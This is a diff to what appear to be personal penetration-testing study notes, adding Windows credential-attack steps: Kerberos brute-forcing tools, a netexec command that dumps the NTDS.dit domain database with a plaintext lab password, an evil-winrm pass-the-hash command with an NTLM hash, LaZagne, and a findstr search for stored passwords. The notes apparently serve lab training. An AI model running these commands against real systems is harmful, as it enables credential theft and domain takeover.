@@ -86,7 +86,7 @@ Default cres:
   https://www.softwaretestinghelp.com/default-router-username-and-password-list/
 
 
-Windows login:
+Windows::
   HKLM\SAM  local hash of creds hash
   HKLM\SYSTEM  key to hash SAM
   HKLM\SECURITY domain and more
@@ -119,12 +119,30 @@ Windows login:
 Create acc list:
   https://github.com/urbanadventurer/username-anarchy
 
-  brute-force with list:
+  brute-force acct with list:
     https://github.com/ropnop/kerbrute
-    or
-    netexec
+  brute-force pwd with list:
+    kerbrute / netexec
 
 
+copy NTDS.dit from C:
+  Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
+  
+  https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service
+  
+  copy and transfer:  netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
+
+Pass the hash (PtH):
+  evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+
+
+Hunt pwd:
+  https://github.com/AlessandroZ/LaZagne
+  https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr
+    C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+
+
+Linux::
   
 
 
